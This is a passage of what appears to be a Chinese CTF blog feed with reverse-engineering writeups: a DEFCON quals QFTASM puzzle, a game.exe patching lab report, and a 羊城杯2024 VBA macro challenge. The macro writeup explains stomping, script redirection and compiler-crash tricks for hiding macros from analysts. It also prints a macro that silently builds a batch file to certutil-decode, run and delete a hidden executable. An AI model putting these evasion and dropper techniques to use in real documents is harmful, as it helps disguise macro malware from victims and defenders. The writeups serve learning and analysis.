class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">0. MNZ 0 0 0</span><br><span class="line">1. MLZ -1 44 43</span><br><span class="line">2. XOR 0 0 2</span><br><span class="line">3. MLZ -1 25971 2</span><br><span class="line">4. MLZ -1 14554 3</span><br><span class="line">5. MLZ -1 22445 4</span><br><span class="line">6. MLZ -1 25411 5</span><br><span class="line">7. MLZ -1 3743 6</span><br><span class="line">8. MLZ -1 13391 7</span><br><span class="line">9. MLZ -1 12059 8</span><br><span class="line">10. MLZ -1 2554 9</span><br><span class="line">11. MLZ -1 15823 10</span><br><span class="line">12. MLZ -1 5921 11</span><br><span class="line">13. MLZ -1 18009 12</span><br><span class="line">14. MLZ -1 14823 13</span><br><span class="line">15. MLZ -1 4757 14</span><br><span class="line">16. MLZ -1 7754 15</span><br><span class="line">17. MLZ -1 22480 16</span><br><span class="line">18. MLZ -1 8371 17</span><br><span class="line">19. MLZ -1 12418 18</span><br><span class="line">20. MLZ -1 22738 19</span><br><span class="line">21. MLZ -1 16499 20</span><br><span class="line">22. MLZ -1 7132 21</span><br><span class="line">23. MLZ -1 22793 22</span><br><span class="line">24. MLZ -1 22307 23</span><br><span class="line">25. MLZ -1 12485 24</span><br><span class="line">26. MLZ -1 7936 25</span><br><span class="line">27. MLZ -1 26630 26</span><br><span class="line">28. MLZ -1 15483 27</span><br><span class="line">29. MLZ -1 6471 28</span><br><span class="line">30. MLZ -1 1806 29</span><br><span class="line">31. MLZ -1 22705 30</span><br><span class="line">32. MLZ -1 25019 31</span><br><span class="line">33. MLZ -1 16442 32</span><br><span class="line">34. MLZ -1 5145 33</span><br><span class="line">35. MLZ -1 15593 34</span><br><span class="line">36. MLZ -1 23867 35</span><br><span class="line">37. MLZ -1 23738 36</span><br><span class="line">38. MLZ -1 14086 37</span><br><span class="line">39. MLZ -1 23123 38</span><br><span class="line">40. MLZ -1 0 39</span><br><span class="line">41. XOR A1 38357 39</span><br><span class="line">42. SUB A39 A2 2</span><br><span class="line">43. XOR A1 51518 39</span><br><span class="line">44. SUB A39 A3 3</span><br><span class="line">45. XOR A1 42987 39</span><br><span class="line">46. SUB A39 A4 4</span><br><span class="line">47. XOR A1 37801 39</span><br><span class="line">48. SUB A39 A5 5</span><br><span class="line">49. XOR A1 65311 39</span><br><span class="line">50. SUB A39 A6 6</span><br><span class="line">51. XOR A1 50346 39</span><br><span class="line">52. SUB A39 A7 7</span><br><span class="line">53. XOR A1 57197 39</span><br><span class="line">54. SUB A39 A8 8</span><br><span class="line">55. XOR A1 64121 39</span><br><span class="line">56. SUB A39 A9 9</span><br><span class="line">57. XOR A1 52768 39</span><br><span class="line">58. SUB A39 A10 10</span><br><span class="line">59. XOR A1 59293 39</span><br><span class="line">60. SUB A39 A11 11</span><br><span class="line">61. XOR A1 46811 39</span><br><span class="line">62. SUB A39 A12 12</span><br><span class="line">63. XOR A1 51793 39</span><br><span class="line">64. SUB A39 A13 13</span><br><span class="line">65. XOR A1 58134 39</span><br><span class="line">66. SUB A39 A14 14</span><br><span class="line">67. XOR A1 61092 39</span><br><span class="line">68. SUB A39 A15 15</span><br><span class="line">69. XOR A1 43041 39</span><br><span class="line">70. SUB A39 A16 16</span><br><span class="line">71. XOR A1 53519 39</span><br><span class="line">72. SUB A39 A17 17</span><br><span class="line">73. XOR A1 49398 39</span><br><span class="line">74. SUB A39 A18 18</span><br><span class="line">75. XOR A1 43302 39</span><br><span class="line">76. SUB A39 A19 19</span><br><span class="line">77. XOR A1 45253 39</span><br><span class="line">78. SUB A39 A20 20</span><br><span class="line">79. XOR A1 60482 39</span><br><span class="line">80. SUB A39 A21 21</span><br><span class="line">81. XOR A1 43375 39</span><br><span class="line">82. SUB A39 A22 22</span><br><span class="line">83. XOR A1 42895 39</span><br><span class="line">84. SUB A39 A23 23</span><br><span class="line">85. XOR A1 49440 39</span><br><span class="line">86. SUB A39 A24 24</span><br><span class="line">87. XOR A1 61298 39</span><br><span class="line">88. SUB A39 A25 25</span><br><span class="line">89. XOR A1 39026 39</span><br><span class="line">90. SUB A39 A26 26</span><br><span class="line">91. XOR A1 52477 39</span><br><span class="line">92. SUB A39 A27 27</span><br><span class="line">93. XOR A1 59810 39</span><br><span class="line">94. SUB A39 A28 28</span><br><span class="line">95. XOR A1 63354 39</span><br><span class="line">96. SUB A39 A29 29</span><br><span class="line">97. XOR A1 43325 39</span><br><span class="line">98. SUB A39 A30 30</span><br><span class="line">99. XOR A1 37437 39</span><br><span class="line">100. SUB A39 A31 31</span><br><span class="line">101. XOR A1 45240 39</span><br><span class="line">102. SUB A39 A32 32</span><br><span class="line">103. XOR A1 58524 39</span><br><span class="line">104. SUB A39 A33 33</span><br><span class="line">105. XOR A1 52575 39</span><br><span class="line">106. SUB A39 A34 34</span><br><span class="line">107. XOR A1 44477 39</span><br><span class="line">108. SUB A39 A35 35</span><br><span class="line">109. XOR A1 44326 39</span><br><span class="line">110. SUB A39 A36 36</span><br><span class="line">111. XOR A1 51043 39</span><br><span class="line">112. SUB A39 A37 37</span><br><span class="line">113. XOR A1 43719 39</span><br><span class="line">114. SUB A39 A38 38</span><br><span class="line">115. MLZ -1 65534 0</span><br><span class="line">116. MLZ 0 0 0</span><br><span class="line">117. MNZ 0 0 0</span><br></pre></td></tr></table></figure><p>代码逻辑还是很明显的——</p><p>初始化，放一堆数字在2到38，A1依次和另一堆数字异或后减去Ai位置数放在i位</p><p>A1与38357异或后放在39位，[A39]减[A2]放在A2，[2]从25971变成12386</p><p>（异或具有对称性，得A1为-65536)</p><p>QFTASM Interpreter——<a href="https://darthnithin.github.io/qftasm-interpreter/qftasm.html">https://darthnithin.github.io/qftasm-interpreter/qftasm.html</a></p><p>跑一下，什么都没有——怎么绘世呢？</p><p>我们可以看到，A1使用的最多，但是没有初始值——要爆破了（已知头是OOO，O是79）</p><p>知道第一位是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">65536</span>):</span><br><span class="line">    value = (i^<span class="number">38357</span>)</span><br><span class="line">    <span class="keyword">if</span> (value)-<span class="number">25971</span> == <span class="number">79</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># 61463</span></span><br></pre></td></tr></table></figure><p>把上面汇编塞一行——3. MLZ -1 61463 1，再放编译器跑一下，非常美丽的ascii出现了——</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">79</span>,<span class="number">79</span>,<span class="number">79</span>,<span class="number">123</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">95</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end= <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#OOO&#123;in_this_life___youre_on_your_own&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DEFCON-quals-Rev-ncHEVjuw-txt&quot;&gt;&lt;a href=&quot;#DEFCON-quals-Rev-ncHEVjuw-txt&quot; class=&quot;headerlink&quot; title=&quot;DEFCON quals | Rev  ncHEVjuw.txt&quot;&gt;</summary>
      
    
    
    
    
    <category term="Reverse Golly DEFCON" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/Reverse-Golly-DEFCON/"/>
    
  </entry>
  
  <entry>
    <title>NKGame 实验报告</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/NKgame/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/NKgame/</id>
    <published>2024-09-14T16:00:00.000Z</published>
    <updated>2024-09-20T05:47:17.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NKgame-reverse"><a href="#NKgame-reverse" class="headerlink" title="NKgame reverse"></a>NKgame reverse</h1><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>   逆向分析game.exe二进制代码的主要逻辑结构和重要数据。</li></ol><p>1）查找主要函数和流程：使用反汇编工具打开game.exe，查找程序的入口点，然后分析主要函数和流程。</p><p>先扔DIE——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps1.jpg" alt="img"> </p><p>扔IDA x32里——</p><p>分析game.exe程序流程——</p><p>整个程序共分为了4个关卡，四个关卡对应四个地图，玩家需要操控主角通过这四个关卡，然后会回到最开始的关卡，在这个关卡的地图的下方的海边找到最后的NPC并与之对话就可以得到最后的flag。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps2.jpg" alt="img"> </p><p>2）理解关卡切换条件：找到关卡切换的条件判断语句。</p><p>对于这四个关卡，每个关卡的通关条件是要击杀足够多的怪物，只有击杀的怪物数量足够后，才能进入下一个关卡。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps3.jpg" alt="img"> </p><p>3）识别主角和怪物的关键数据：查找和理解主角和怪物的血量、移速、攻击范围、攻击力等关键数据的使用方式。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps4.jpg" alt="img"> </p><ol start="2"><li>   修改game.exe二进制代码， 在实验报告中说明代码修改的具体过程。</li></ol><p>1）打开游戏进行体验。体验后发现，角色死亡后，屏幕上显示“died”,因此在字符串中搜索，来找到游戏人物死亡判定的代码</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps5.jpg" alt="img"><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps6.jpg" alt="img"> </p><p>跳转到程序代码中，将jb改成jmp，就实现了不死</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps7.jpg" alt="img"> </p><p>2）继续闯关，进入下一关时却给出如下提示：You need to kill enough monsters!</p><p>再次利用ida pro搜索字符串You need to kill enough monsters!</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps8.jpg" alt="img"> </p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps9.jpg" alt="img"> </p><p>跳转到程序代码中，将jz改成jmp，就可以直接开始下一关。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps10.jpg" alt="img"> </p><p>3）继续游戏——</p><h2 id="二、实验结果"><a href="#二、实验结果" class="headerlink" title="二、实验结果"></a>二、实验结果</h2><p>运行游戏，未再出现相关失败提示，最后通关并得到flag:</p><p>(第一次不小心跳过flag了，在flag这里下个断点）</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps11.jpg" alt="img"> </p><p>flag{a2fdkd80xo}</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps12.jpg" alt="img"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NKgame-reverse&quot;&gt;&lt;a href=&quot;#NKgame-reverse&quot; class=&quot;headerlink&quot; title=&quot;NKgame reverse&quot;&gt;&lt;/a&gt;NKgame reverse&lt;/h1&gt;&lt;h2 id=&quot;实验步骤&quot;&gt;&lt;a href=&quot;#实</summary>
      
    
    
    
    
    <category term="RE GAME CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE-GAME-CTF/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2024 | Reverse_docCrack</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/04/%F0%9F%90%8F%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%20%20Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/04/%F0%9F%90%8F%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%20%20Reverse/</id>
    <published>2024-09-03T16:00:00.000Z</published>
    <updated>2024-09-16T07:53:19.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="🐏羊城杯2024-Reverse-docCrack"><a href="#🐏羊城杯2024-Reverse-docCrack" class="headerlink" title="🐏羊城杯2024 | Reverse_docCrack"></a>🐏羊城杯2024 | Reverse_docCrack</h1><p>题目链接：<a href="https://github.com/CTF-Archives/2024-YCB-Undergraduate/releases/download/v1.0/Reverse-docCrack.zip">Reverse-docCrack</a></p><p>一道很意外的逆向题目，打开一瞬间懵了一下。细细思考，之前有简单了解过宏病毒之类的。感觉是一道很有意思的题目，所以打算好好记录一下这道题。</p><p>记得之前<a href="https://blog.xinshi.fun/wp/yangcheng-2024/#reverse-doccrack">LilRan师傅发过该篇的题解</a>，qq空间往下滑一滑，发现之前有提到过类似的出题方法（VBA）（看来做的题实在是太少了——），果然光看师傅们的空间就能学到好多东西。</p><p>以下是学习笔记——</p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>参考文章——[VBA脚本文件重定向](<a href="https://mp.weixin.qq.com/s/QbX84NmVXNdV42W4PkNl_A">VBA脚本文件重定向 (qq.com)</a>)、[VBA隐藏技术stomping](<a href="https://mp.weixin.qq.com/s/VmVdvD9c6p9Hdo9MZiIyZg">VBA隐藏技术stomping (qq.com)</a>) 、[VBA脚本终章编译器崩溃](<a href="https://mp.weixin.qq.com/s/d2mULeMn9dft68hzZC3-yQ">VBA脚本终章编译器崩溃 (qq.com)</a>)</p><h3 id="VBA宏代码"><a href="#VBA宏代码" class="headerlink" title="VBA宏代码"></a>VBA宏代码</h3><p>将Office文档中嵌入以VBA(Visual Basic for Applications)编写的宏代码脚本，当运行Office文档时，便可以执行各种命令。</p><h3 id="VBA脚本文件重定向"><a href="#VBA脚本文件重定向" class="headerlink" title="VBA脚本文件重定向"></a>VBA脚本文件重定向</h3><p>为防止分析人员直接打开宏编辑器查看宏的源码，分析脚本功能，微软提供的工程加密工具仍能被替换脚本中的加密模块进行验证绕过，所以VBA脚本文件重定向对脚本默认文件vbaProject.bin进行替换，在打开文本时加载其他文件，增加分析者的分析复杂程度。</p><p>此处的脚本文件重定向，是将vbaProject.bin进行伪装，比如styIes.xmI（用大写i替换小写L），之后修改相关的三个文件以保证程序正常进行——</p><p><strong>根目录的[Content_Types].xml：</strong></p><p>添加一个标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Default Extension=&quot;xmI&quot; ContentType=&quot;application/vnd.ms-office.vbaProject&quot;/&gt;</span><br></pre></td></tr></table></figure><p><strong>\word_rels文件夹的</strong></p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240903225844894.png" alt="image-20240903225844894" style="zoom:50%;" /><p>修改vbaProject.bin.rles文件的名字为styIes.xmI.rels</p><p>将document.xml.rels文件中Target指向改为styIes.xmI (都是大写i)</p><h3 id="VBA隐藏技术stomping"><a href="#VBA隐藏技术stomping" class="headerlink" title="VBA隐藏技术stomping"></a>VBA隐藏技术stomping</h3><p>脚本重定向技术无法绕过Microsoft OLE分析工具的检测。</p><p>stomping 可以破坏 Microsoft Office 文档中的 VBA 源代码，对Microsoft OLE分析工具进行欺骗，干扰其分析结果。</p><p><strong>OLE分析工具</strong>是通过搜索”Attribut”这个特征来定位宏的位置。</p><blockquote><p>VBA二进制脚本文件中即包含了源码字符，又包含了P-Code，VBA中的P-Code，其本质是对源码字符的编译压缩，因此实现的功能是相同的，即VBA二进制脚本中存在两份功能一致的代码，只是存在的形式不同，而oletools不会去解析P-Code。</p><p>如果满足脚本编译环境和执行环境的VBA版本一致，可以修改源码部分，这样oletools解析的结果就是我们修改后的代码，而解释器依旧会执行旧代码</p></blockquote><h3 id="VBA编译器崩溃"><a href="#VBA编译器崩溃" class="headerlink" title="VBA编译器崩溃"></a>VBA编译器崩溃</h3><p>当脚本编译环境和执行环境的VBA版本不一致，编译器无法打开。<br>或者在vbaProject.bin文件中，修改Module&#x3D;后的值删除，（保留换行符0x0D,0x0A），后面信息信息需要前移，也可以使编译器崩溃</p><h3 id="修复崩溃"><a href="#修复崩溃" class="headerlink" title="修复崩溃"></a>修复崩溃</h3><p>根据上文提到的方法反推，可以试着修复VBA文件，查看崩溃原因是否是由Module信息的缺失引起的，如果是该原因，修复该处缺失的信息。</p><p>常规OFFICE文档文件中，在word目录下的vbaData.xml文件中含有模块信息。</p><p>在[b773fa65bb375e6fe6d387f301f6bf33219189ea1d4a06762e965a9eba7de4e8]中，vbaData.xml文件被重定位到iuM.dsn，因此我们打开iuM.dsn。</p><p>我们可以看到wne:name&#x3D;”Project.Module1.AutoOpen”，其中Project代表Project流，Module1是Module的名字，等于同我们自己生成文件的NewMacros，后门AutoOpen是函数名。</p><p>打开EbDYTPZ[.]vEypm文件，通过特征”&#x2F;&amp;H00000000“特征定位Module，可以发现该处并没有Module模块，确定攻击者将该字段抹除。</p><p>因此修复该文件需要Module的信息重新编辑进去，其余信息后移。</p><p>修复完脚本文件后，重新将文档文件打包，修改后缀，然后打开word，点击的编译器编辑按钮，发现VBA脚本编译器可以正常打开。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>VBA编译器崩溃技术与stomping和重定向技术没有冲突，三者可以相互组合使用，互补每个技术中存在的缺陷，</p><h2 id="回到这个题目"><a href="#回到这个题目" class="headerlink" title="回到这个题目"></a>回到这个题目</h2><p>(启用宏——)</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904001558987.png" alt="image-20240904001558987"></p><p>拆开包发现没有重定向、运行宏文件也没有报错，直接用 oletools 反编译 P-code——</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install -U oletools[full]</span><br><span class="line">olevba -c protected_secret.docm &gt; code.vbs</span><br></pre></td></tr></table></figure><p>代码出来了</p><p>看看主要代码——</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="built_in">Len</span>(inflag)</span><br><span class="line">            res = <span class="built_in">Chr</span>(<span class="built_in">Asc</span>(<span class="built_in">Mid</span>(inflag, i, <span class="number">1</span>)) <span class="keyword">Xor</span> <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">            Result = Result &amp; res</span><br><span class="line">        <span class="keyword">Next</span> i</span><br><span class="line"> xpkdb = dWPtWzWvKrZRFrsAWZMGNjZQbCrgAImKXVUkOykXWeRltpUU + AMaKeZzlhAtdNANKAKwMNbKEKUWuQVZQbbCJIUog + BvEKpalonhsRIgbPkYPYbsbQGzIzvPitapncgtGKIo + yBILPYnXCUApVHExOtpKlnfTkVfexwgrFQOFIveA + pqdgalQAZJKIDySPundFqdITahrgAYveJXfZCOUHWnUDKXZwZU + pErQJcjFIvYQeIehtTPMaOgEwFvvjnaTkabtJDvpHbWG + QmLHKhwBebnYaryyPsFeBassnVEjIoURcqNseXyjyMdcDfFnag</span><br><span class="line"></span><br><span class="line">tempPath = ThisDocument.Path &amp; <span class="string">&quot;\temp1&quot;</span></span><br><span class="line">        <span class="keyword">Set</span> tempfile = fso.CreateTextFile(tempPath, <span class="literal">True</span>)</span><br><span class="line">        fso.GetFile(tempPath).Attributes = <span class="number">2</span></span><br><span class="line">        tempfile.WriteLine xpkdb</span><br><span class="line">        tempfile.Close</span><br><span class="line">        </span><br><span class="line">        batPath = ThisDocument.Path &amp; <span class="string">&quot;\temp.bat&quot;</span></span><br><span class="line">        <span class="keyword">Set</span> batFile = fso.CreateTextFile(batPath, <span class="literal">True</span>)</span><br><span class="line">        fso.GetFile(batPath).Attributes = <span class="number">2</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;@echo off&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;cd /d &quot;</span> &amp; ThisDocument.Path</span><br><span class="line">        batFile.WriteLine <span class="string">&quot;certutil -decode temp1 temp|certutil -decode temp temp.exe&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;del temp&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;temp.exe &quot;</span> &amp; <span class="string">&quot;&quot;&quot;&quot;</span> &amp; Result &amp; <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;del temp.exe&quot;</span></span><br><span class="line">        batFile.Close</span><br><span class="line">        <span class="keyword">Set</span> objExec = objShell.Exec(batPath)</span><br><span class="line">        <span class="keyword">Set</span> objStdOut = objExec.StdOut</span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> <span class="keyword">Not</span> objStdOut.AtEndOfStream</span><br><span class="line">            output = <span class="built_in">Trim</span>(objStdOut.ReadLine)</span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">        output = <span class="built_in">Left</span>(output, <span class="built_in">Len</span>(output))</span><br><span class="line">        StartTime = Timer</span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> Timer &lt; StartTime + <span class="number">1</span></span><br><span class="line">            DoEvents</span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">        fso.DeleteFile batPath</span><br><span class="line">        fso.DeleteFile tempPath</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">If</span> output = <span class="string">&quot;good&quot;</span> <span class="keyword">Then</span></span><br><span class="line">            temp = <span class="built_in">MsgBox</span>(<span class="string">&quot;good!!!&quot;</span>, , <span class="string">&quot;congratulations!!!&quot;</span>)</span><br><span class="line">            <span class="keyword">Exit</span> <span class="keyword">Do</span></span><br><span class="line">        <span class="keyword">Else</span></span><br><span class="line">            temp = <span class="built_in">MsgBox</span>(<span class="string">&quot;Sorry, U are wrong!!!&quot;</span>, , <span class="string">&quot;Hacked_by_??????&quot;</span>)</span><br><span class="line">            isContinue = <span class="built_in">MsgBox</span>(<span class="string">&quot;Continue?&quot;</span>, vbYesNo + vbQuestion, <span class="string">&quot;Warning&quot;</span>)</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Loop</span> <span class="keyword">While</span> isContinue = <span class="number">6</span></span><br></pre></td></tr></table></figure><p>flag每位异或7</p><p>temp1为两次base64加密后的文件，temp.bat为验证后保存结果的文件</p><p>断点下了，但是跑不起来，直接抠出来——</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前面省略了</span></span><br><span class="line">xpkdb = dWPtWzWvKrZRFrsAWZMGNjZQbCrgAImKXVUkOykXWeRltpUU + AMaKeZzlhAtdNANKAKwMNbKEKUWuQVZQbbCJIUog + BvEKpalonhsRIgbPkYPYbsbQGzIzvPitapncgtGKIo + yBILPYnXCUApVHExOtpKlnfTkVfexwgrFQOFIveA + pqdgalQAZJKIDySPundFqdITahrgAYveJXfZCOUHWnUDKXZwZU + pErQJcjFIvYQeIehtTPMaOgEwFvvjnaTkabtJDvpHbWG + QmLHKhwBebnYaryyPsFeBassnVEjIoURcqNseXyjyMdcDfFnag</span><br><span class="line"></span><br><span class="line">exe = <span class="string">&quot;123.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(exe, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(xpkdb)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904014341602.png" alt="image-20240904014341602"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904014522420.png" alt="image-20240904014522420"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904014546252.png" alt="image-20240904014546252"></p><p>解码——</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">v7 = [<span class="number">0</span>]*<span class="number">54</span></span><br><span class="line">v7[<span class="number">0</span>] = <span class="number">4288</span></span><br><span class="line">v7[<span class="number">1</span>] = <span class="number">4480</span></span><br><span class="line">v7[<span class="number">2</span>] = <span class="number">5376</span></span><br><span class="line">v7[<span class="number">3</span>] = <span class="number">4352</span></span><br><span class="line">v7[<span class="number">4</span>] = <span class="number">5312</span></span><br><span class="line">v7[<span class="number">5</span>] = <span class="number">4160</span></span><br><span class="line">v7[<span class="number">6</span>] = <span class="number">7936</span></span><br><span class="line">v7[<span class="number">7</span>] = <span class="number">5184</span></span><br><span class="line">v7[<span class="number">8</span>] = <span class="number">6464</span></span><br><span class="line">v7[<span class="number">9</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">10</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">11</span>] = <span class="number">3456</span></span><br><span class="line">v7[<span class="number">12</span>] = <span class="number">7424</span></span><br><span class="line">v7[<span class="number">13</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">14</span>] = <span class="number">6336</span></span><br><span class="line">v7[<span class="number">15</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">16</span>] = <span class="number">6720</span></span><br><span class="line">v7[<span class="number">17</span>] = <span class="number">6144</span></span><br><span class="line">v7[<span class="number">18</span>] = <span class="number">6272</span></span><br><span class="line">v7[<span 